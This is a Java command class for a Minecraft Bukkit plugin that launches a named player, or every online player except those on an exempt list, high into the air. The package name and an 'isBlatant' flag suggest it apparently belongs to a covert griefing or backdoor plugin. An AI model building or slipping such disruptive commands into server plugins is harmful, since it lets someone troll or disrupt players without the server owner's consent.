package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class LaunchCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p) {
		if (args.length <= 1) {
			p.sendMessage(Settings.USAGE("launch <player>"));
		} else {
			if (args[1].equals("*")) {
				for (Player a : Bukkit.getOnlinePlayers()) {
					if (!plugin.lite.contains(a.getName())) {
						a.setVelocity(a.getVelocity().setY(100));
					}
				}
				p.sendMessage(Settings.PREFIX("Everyone was launched into the air!"));
			} else {
				Player target = Bukkit.getServer().getPlayer(args[1]);
				if (target == null) {
					p.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
				} else {
					target.setVelocity(target.getVelocity().setY(100));
					p.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + Settings.WHITE + " was launched into the air!"));
				}
			}
		}
	}

    @Override
    public boolean isBlatant() {
        return false;
    }
}
